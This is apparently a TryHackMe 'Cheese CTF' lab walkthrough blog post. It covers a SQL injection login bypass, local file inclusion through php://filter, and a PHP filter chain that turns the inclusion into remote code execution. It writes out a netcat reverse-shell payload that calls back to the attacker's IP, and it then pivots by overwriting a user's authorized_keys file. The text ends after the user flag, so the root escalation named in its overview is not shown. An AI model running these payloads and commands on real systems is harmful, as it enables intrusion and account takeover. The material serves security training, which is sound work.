---
title: 'TryHackMe: Cheese CTF Walkthrough'
author: 0xcrax
categories: [TryHackMe]
tags: [web, rustscan, portspoofing, feroxbuster, sqli, sqlmap, LFI, RCE, ssh, service, timer, suid, sudo, sysmemstl, grep, openssl, unshadow]
render_with_liquid: true
img_path: /images/TryHackMe/Cheese
image:
  path: /images/TryHackMe/Cheese/room_image.webp
---

🧰 Writeup Overview

we bypassed the login page using an `SQL injection` and discovered an endpoint `vulnerable to LFI`. By `chaining PHP filters`, we turned the LFI into `RCE` and gained an initial foothold on the system. After that, we exploited a `writable authorized_keys file` to pivot to another user. As this new user, we fixed a `syntax error in a timer` and used `sudo privileges` to start it, which allowed us to create a `SUID binary`. Finally, by exploiting this binary, we `escalated privileges to root`.

<a href="https://tryhackme.com/room/cheesectfv10" target="_blank" class="box-button" data-mobile-text="Cheese CTF Challenge | TryHackMe" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background: linear-gradient(135deg, #2a0e0e 0%, #1a0505 100%); padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); color: #ff4444; text-decoration: none; font-family: Arial, sans-serif; font-weight: bold; border: 1px solid #ff5555; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 25px rgba(255, 0, 0, 0.7)'; this.style.color='#ffffff';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(255, 0, 0, 0.3)'; this.style.color='#ff4444';">
<span>Cheese CTF Challenge | TryHackMe</span>
<img src="/images/TryHackMe/THM.webp" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; filter: hue-rotate(300deg) brightness(0.9); transition: all 0.3s ease;" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='hue-rotate(320deg) brightness(1.3)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='hue-rotate(300deg) brightness(0.9)';">
</a>

## Initial Enumeration

### rustscan

Upon examining the ports All Ports Appear Open, it turned out to be a rabbit hole, or in other words, fake ports that may or may not have services.
```console 
┌──(cracker㉿carcker)-[~/Desktop/THM/Cheese-CTF]
└─$ rustscan -a 10.10.202.162 — range 1–65535  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
Open  10.10.202.162
etc...
```
Spoofing ports with services or no can be a technique used to enhance security by confusing potential attackers also known as `Emulating Services` or `Camouflage Techniques`. One popular tool for this is <a href="https://github.com/drk1wi/portspoof" target="_blank">Portspoof</a>, so this <a href="https://www.darknet.org.uk/2018/04/portspoof-spoof-all-ports-open-emulate-valid-services/" target="_blank">Explain Portspoof</a>

### trying a common ports & Discovering a website

By checking the common open ports it is clear that custom `web application` is running on port `80`.

![](/images/TryHackMe/Cheese/login-page-on-port-80.png)

##  bypass a login page authentication using SQL injection
#### **option |**

```console
sqlmap -r req.txt --dbs level-3 risk-3
```

The request from Burp Suite
```console
POST /login.php HTTP/1.1

Host: 10.10.202.162

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 30

Origin: http://10.10.202.162

Connection: keep-alive

Referer: http://10.10.202.162/login.php

Upgrade-Insecure-Requests: 1


username=ee&password=czcxzxcxz
```

![](/images/TryHackMe/Cheese/sqlmap.png)

We also found that the DBMS is `MySQL`.

#### **option ||**
![](/images/TryHackMe/Cheese/sql-injection.png)

After trying a couple of simple SQL injection payloads, we are able to bypass the login using the payload `' || 1=1;-- -` as the username.

> we can discover the `/secret-script.php` endpoint by fuzzing the web application for files, which reveals `messages.html` that links to it. Since there is no authentication mechanism, you can access it directly without logging in.
{: .prompt-tip }

#### **option |||**
```console
┌──(cracker㉿carcker)-[~/Desktop/THM/Cheese-CTF]
└─$ feroxbuster -u http://10.10.202.162/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt 
                                                                                                                                                                                                                                 
 ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
 by Ben "epi" Risher 🤓                 ver: 2.10.4
 ───────────────────────────┬──────────────────────
🎯  Target Url            │ http://10.10.202.162/
🚀  Threads               │ 50
📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
👌  Status Codes          │ All Status Codes!
💥  Timeout (secs)        │ 7
🦡  User-Agent            │ feroxbuster/2.10.4
💉  Config File           │ /etc/feroxbuster/ferox-config.toml
🔎  Extract Links         │ true
🏁  HTTP methods          │ [GET]
🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
 ───────────────────────────┴──────────────────────
🏁  Press [ENTER] to use the Scan Management Menu™
 ──────────────────────────────────────────────────
 404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 200      GET       57l       97w      705c http://10.10.202.162/style.css
 200      GET       22l      152w    11038c http://10.10.202.162/images/cheese3.jpg
 200      GET       28l       53w      834c http://10.10.202.162/login.php
 200      GET      101l      602w    47221c http://10.10.202.162/images/cheese1.jpg
 200      GET       60l      106w      966c http://10.10.202.162/login.css
 200      GET       59l      121w     1759c http://10.10.202.162/index.html
 200      GET       83l      491w    40571c http://10.10.202.162/images/cheese2.jpg
 200      GET       59l      121w     1759c http://10.10.202.162/
 200      GET       18l       35w      377c http://10.10.202.162/users.html
 200      GET       18l       35w      380c http://10.10.202.162/orders.html
 200      GET        0l        0w        0c http://10.10.202.162/secret-script.php
 200      GET       18l       33w      448c http://10.10.202.162/messages.html
 [**************] - 3m     17143/17143   0s      found:12      errors:0      
 [**************] - 3m     17130/17130   112/s   http://10.10.202.162/ 
 [**************] - 1s     17130/17130   13056/s http://10.10.202.162/images/ => Directory listing 
 ```
 
 
![](/images/TryHackMe/Cheese/messages.png)
 
this will redirect us to `http://10.10.202.162/secret-script.php?file=php://filter/resource=supersecretmessageforadmin`
 
![](/images/TryHackMe/Cheese/messages2.png)
 
you can check on <a href="https://github.com/danielmiessler/SecLists" target="_blank">SecLists</a>
   
```sh                                                                                                                                                                                                                                  
┌──(cracker㉿carcker)-[~/Desktop/THM/Cheese-CTF]
└─$ grep -r "messages.html" /usr/share/seclists                                                                                                                                                                                 
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt:messages.html
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt:messages.html
/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt:messages.html
/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt:messages.html
/usr/share/seclists/Discovery/Web-Content/SVNDigger/all.txt:admin.messages.html.php
/usr/share/seclists/Discovery/Web-Content/SVNDigger/all.txt:toolbar.messages.html.php
/usr/share/seclists/Discovery/Web-Content/SVNDigger/all.txt:messages.html
/usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/html.txt:messages.html
/usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt:admin.messages.html.php
/usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt:toolbar.messages.html.php
/usr/share/seclists/Discovery/Web-Content/CMS/Django.txt:cms/tests/frontend/unit/fixtures/messages.html
/usr/share/seclists/Discovery/Web-Content/CMS/Django.txt:cms/tests/frontend/unit/html/modal_iframe_messages.html
/usr/share/seclists/Discovery/Web-Content/CMS/Django.txt:tests/auth_tests/templates/context_processors/auth_attrs_messages.html
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/modules/system/templates/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/modules/system/tests/themes/test_messages/templates/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/profiles/demo_umami/themes/umami/templates/components/messages/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/themes/bartik/templates/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/themes/claro/templates/misc/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/themes/classy/templates/misc/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/themes/classy/templates/system/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/themes/seven/templates/classy/misc/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/themes/stable9/templates/media-library/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt:core/themes/stable/templates/misc/status-messages.html.twig
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/magento.txt:app/code/Magento/Ui/view/frontend/web/template/messages.html
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/magento.txt:app/code/Magento/MediaGalleryUi/view/adminhtml/web/template/grid/messages.html
etc...
```
  
## Discovering LFI

will manipulation in `file` parameter.

```console
http://10.10.202.162/secret-script.php?file=../../../etc/passwd
OR
http://10.10.202.162/secret-script.php?file=php://filter/resource=../../../etc/passwd
```

![](/images/TryHackMe/Cheese/lfi.png)

now we locate name  user `comte` in this system.
```console
view-source:http://10.10.202.162/secret-script.php?file=../../../etc/passwd
```
![](/images/TryHackMe/Cheese/user.png)

Then you can explore the rest of the files yourself.
```console
http://10.10.202.162/secret-script.php?file=php://filter/resource=../../../etc/group
```
now check <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers" target="_blank">here</a> About searching for a `filters(wrappers)`.

we will use `Wrapper php://filter` as below:
```console
curl -s http://10.10.202.162/secret-script.php?file=php://filter/convert.base64-encode/resource=login.php | base64 -d
```

```console
http://10.10.202.162/secret-script.php?file=php://filter/convert.base64-encode/resource=login.php
```
output :
```base64
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TG9naW4gUGFnZTwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImxvZ2luLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJsb2dpbi1jb250YWluZXIiPgogICAgICAgIDxoMT5Mb2dpbjwvaDE+CiAgICAgICAgCiAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1c2VybmFtZSI+VXNlcm5hbWU8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJ1c2VybmFtZSIgbmFtZT0idXNlcm5hbWUiIHJlcXVpcmVkPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwYXNzd29yZCI+UGFzc3dvcmQ8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiByZXF1aXJlZD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5Mb2dpbjwvYnV0dG9uPgogICAgICAgIDwvZm9ybT4KICAgICAgICAKICAgIDwvZGl2PgogICAgPD9waHAKLy8gUmVwbGFjZSB0aGVzZSB3aXRoIHlvdXIgZGF0YWJhc2UgY3JlZGVudGlhbHMKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXIgPSAiY29tdGUiOwokcGFzc3dvcmQgPSAiVmVyeUNoZWVzeVBhc3N3b3JkIjsKJGRibmFtZSA9ICJ1c2VycyI7CgovLyBDcmVhdGUgYSBjb25uZWN0aW9uIHRvIHRoZSBkYXRhYmFzZQokY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VyLCAkcGFzc3dvcmQsICRkYm5hbWUpOwoKLy8gQ2hlY2sgdGhlIGNvbm5lY3Rpb24KaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBlY2hvICRjb25uLT5jb25uZWN0X2Vycm9yOwogICAgZGllKCJDb25uZWN0aW9uIGZhaWxlZDogIiAuICRjb25uLT5jb25uZWN0X2Vycm9yKTsKCn0KCi8vIEhhbmRsZSBmb3JtIHN1Ym1pc3Npb24KaWYgKCRfU0VSVkVSWyJSRVFVRVNUX01FVEhPRCJdID09ICJQT1NUIikgewogICAgJHVzZXJuYW1lID0gJF9QT1NUWyJ1c2VybmFtZSJdOwogICAgJHBhc3MgPSAkX1BPU1RbInBhc3N3b3JkIl07CiAgICBmdW5jdGlvbiBmaWx0ZXJPclZhcmlhdGlvbnMoJGlucHV0KSB7CiAgICAgLy9Vc2UgY2FzZS1pbnNlbnNpdGl2ZSByZWd1bGFyIGV4cHJlc3Npb24gdG8gZmlsdGVyICdPUicsICdvcicsICdPcicsIGFuZCAnb1InCiAgICAkZmlsdGVyZWQgPSBwcmVnX3JlcGxhY2UoJy9cYltvT11bclJdXGIvJywgJycsICRpbnB1dCk7CiAgICAKICAgIHJldHVybiAkZmlsdGVyZWQ7Cn0KICAgICRmaWx0ZXJlZElucHV0ID0gZmlsdGVyT3JWYXJpYXRpb25zKCR1c2VybmFtZSk7CiAgICAvL2VjaG8oJGZpbHRlcmVkSW5wdXQpOwogICAgLy8gSGFzaCB0aGUgcGFzc3dvcmQgKHlvdSBzaG91bGQgdXNlIGEgc3Ryb25nZXIgaGFzaGluZyBhbGdvcml0aG0pCiAgICAkaGFzaGVkX3Bhc3N3b3JkID0gbWQ1KCRwYXNzKTsKICAgIAogICAgCiAgICAvLyBRdWVyeSB0aGUgZGF0YWJhc2UgdG8gY2hlY2sgaWYgdGhlIHVzZXIgZXhpc3RzCiAgICAkc3FsID0gIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWU9JyRmaWx0ZXJlZElucHV0JyBBTkQgcGFzc3dvcmQ9JyRoYXNoZWRfcGFzc3dvcmQnIjsKICAgICRyZXN1bHQgPSAkY29ubi0+cXVlcnkoJHNxbCk7CiAgICAkc3RhdHVzID0gIiI7CiAgICBpZiAoJHJlc3VsdC0+bnVtX3Jvd3MgPT0gMSkgewogICAgICAgIC8vIEF1dGhlbnRpY2F0aW9uIHN1Y2Nlc3NmdWwKICAgICAgICAkc3RhdHVzID0gIkxvZ2luIHN1Y2Nlc3NmdWwhIjsKICAgICAgICAgaGVhZGVyKCJMb2NhdGlvbjogc2VjcmV0LXNjcmlwdC5waHA/ZmlsZT1zdXBlcnNlY3JldGFkbWlucGFuZWwuaHRtbCIpOwogICAgICAgICBleGl0OwogICAgfSBlbHNlIHsKICAgICAgICAvLyBBdXRoZW50aWNhdGlvbiBmYWlsZWQKICAgICAgICAgJHN0YXR1cyA9ICJMb2dpbiBmYWlsZWQuIFBsZWFzZSBjaGVjayB5b3VyIHVzZXJuYW1lIGFuZCBwYXNzd29yZC4iOwogICAgfQp9Ci8vIENsb3NlIHRoZSBkYXRhYmFzZSBjb25uZWN0aW9uCiRjb25uLT5jbG9zZSgpOwo/Pgo8ZGl2IGlkID0gInN0YXR1cyI+PD9waHAgZWNobyAkc3RhdHVzOyA/PjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K
```

```php
<body>
    <div class="login-container">
        <h1>Login</h1>
        
        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>
        
    </div>
    <?php
// Replace these with your database credentials
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";

// Create a connection to the database
$conn = new mysqli($servername, $user, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    echo $conn->connect_error;
    die("Connection failed: " . $conn->connect_error);

}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $pass = $_POST["password"];
    function filterOrVariations($input) {
     //Use case-insensitive regular expression to filter 'OR', 'or', 'Or', and 'oR'
    $filtered = preg_replace('/\b[oO][rR]\b/', '', $input);
    
    return $filtered;
}
    $filteredInput = filterOrVariations($username);
    //echo($filteredInput);
    // Hash the password (you should use a stronger hashing algorithm)
    $hashed_password = md5($pass);
    
    
    // Query the database to check if the user exists
    $sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
    $result = $conn->query($sql);
    $status = "";
    if ($result->num_rows == 1) {
        // Authentication successful
        $status = "Login successful!";
         header("Location: secret-script.php?file=supersecretadminpanel.html");
         exit;
    } else {
        // Authentication failed
         $status = "Login failed. Please check your username and password.";
    }
}
// Close the database connection
$conn->close();
?>
<div id = "status"><?php echo $status; ?></div>
</body>
```

Now, you can notice that the verification is not accepted in the word 'OR', 'or', 'Or', and 'oR' when input `' OR 1 -- -` instead that we will use `' || 1 -- -`


> By examining the source code of secret-script.php, we see that it simply takes the file parameter and calls include with it.
{: .prompt-tip }


```console
curl -s http://10.10.202.162/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php | base64 -d
```
```console
http://10.10.202.162/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php
```
output :
```php
<?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
```

## RCE with PHP Filters Chain
now will be able to turn the `php://filter` into a `full RCE` in generally Convert LFI to RCE .

> you can check <a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it" target="_blank">here</a> how this attack work.
{: .prompt-info }

Firstly, generate a payload using the php <a href="https://github.com/synacktiv/php_filter_chain_generator" target="_blank">filter chain generator.py</a>.

> Another script you can generate your backdoor check <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d" target="_blank">here</a>
{: .prompt-tip }

```console
wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/refs/heads/main/php_filter_chain_generator.py
```
```python
python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
```
output => the payload
```console
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

![](/images/TryHackMe/Cheese/first-payload.png)

now we able to execute any command on the system.

```python
python3 php_filter_chain_generator.py --chain '<?php print exec('hostname'); ?>
```
output :
```console
cheesectf � P�������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
```

```python
python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.108.58 4444 >/tmp/f"); ?>' | grep '^php'  > payload.txt
```
> must using `grep '^php'` in command to **filter out and capture only lines in the output of php_filter_chain_generator.py that start with php**.
{: .prompt-info }

**then run a listner such netcat to capture the connection.**

finnaly get shell as www-data by sending our payload as the `file` parameter.
```console
curl -s "http://10.10.202.162/secret-script.php?file=$(cat payload.txt)"
```

## Shell as www-data
```console
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.108.58] from (UNKNOWN) [10.10.202.162] 48552
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ which python
```

```python
python3 -c "import pty;pty.spawn('/bin/bash')"
```

```sh
www-data@cheesectf:/var/www/html$ export TERM=xterm-256color
export TERM=xterm-256color
```

```console
www-data@cheesectf:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as comte
we can using linpeas simply

<a href="https://linpeas.sh/" target="_blank" class="box-button" data-mobile-text="Linpeas" style="display: flex; width: 100%; max-width: 1000px; align-items: center; justify-content: center; background-color: #0d1b1e; padding: 15px 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 255, 127, 0.2); color: #00ff88; text-decoration: none; font-family: 'Monaco', monospace; font-weight: bold; border: 1px solid #00ff88; margin: 10px auto; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 0 20px rgba(0, 255, 127, 0.6)'; this.style.color='#ffffff';" onmouseout="this.style.transform='translateY(0px)'; this.style.boxShadow='0 4px 15px rgba(0, 255, 127, 0.2)'; this.style.color='#00ff88';">
<span>Linpeas</span>
<img src="/images/TryHackMe/linpeas.png" alt="Icon" style="width: 48px; height: 48px; margin-right: 10px; filter: hue-rotate(120deg) brightness(0.9); transition: all 0.3s ease;" onmouseover="this.style.transform='scale(1.1)'; this.style.filter='hue-rotate(140deg) brightness(1.3)';" onmouseout="this.style.transform='scale(1)'; this.style.filter='hue-rotate(120deg) brightness(0.9)';">
</a>

when checking for `files writable` we will see as below.

```sh
find /  -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
```
output
```console
/home/comte/.ssh/authorized_keys
/etc/systemd/system/exploit.timer
```

- `-E`: Enables extended regular expressions (regex), which allows for more complex matching patterns (such as alternations using **pipe symbol**).

- `-v`: Inverts the match. Instead of showing lines that match the pattern, it shows lines that do not match.

- `'^(/proc|/snap|/sys|/dev)'`: A regex pattern that matches paths starting with /proc, /snap, /sys, or /dev. These directories are often system-related or virtual filesystems that should be excluded from the results (e.g., /proc contains virtual files related to processes, /sys deals with system devices, etc.).

____________________________________________________________________________

now we need to generate an `SSH key` to add it into the `authorized_keys` file.

```sh
ssh-keygen -f cheese_rsa -t rsa
```
- `-f` : file name
- `-t` : type

```sh
cat cheese_rsa.pub
```

![](/images/TryHackMe/Cheese/ssh-keygen.png)

> now upload `cheese_rsa.pub` into target machine
{: .prompt-info }

```sh
www-data@cheesectf:/var/www/html$ echo "ssh-rsa AAAAB3NzaC1y......" > /home/comte/.ssh/authorized_keys
```

```sh
ssh -i cheese_rsa comte@10.10.202.162
```
```sh
comte@cheesectf:~$ id 
uid=1000(comte) gid=1000(comte) groups=1000(comte),24(cdrom),30(dip),46(plugdev)
comte@cheesectf:~$ head -c4250 user.txt 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
